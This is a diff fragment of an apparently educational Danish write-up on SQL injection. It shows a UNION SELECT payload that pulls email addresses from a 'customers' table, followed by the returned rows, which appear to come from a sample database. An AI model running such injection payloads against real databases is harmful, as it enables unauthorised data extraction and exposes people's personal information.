@@ -344,3 +344,28 @@ Result from database:
 ```
 
 Nu ved jeg hvad collonnerne hedder. Med `2 UNION SELECT 1,Email,3 FROM customers` kan jeg få email.
+
+```linenums="0"
+-- snippet --
+[
+1,
+"tgoyer@apple.com",
+3
+],
+[
+1,
+"vstevens@yahoo.com",
+3
+],
+[
+1,
+"wyatt.girard@yahoo.fr",
+3
+],
+[
+2,
+"Balls to the Wall",
+2
+]
+-- snippet --
+```
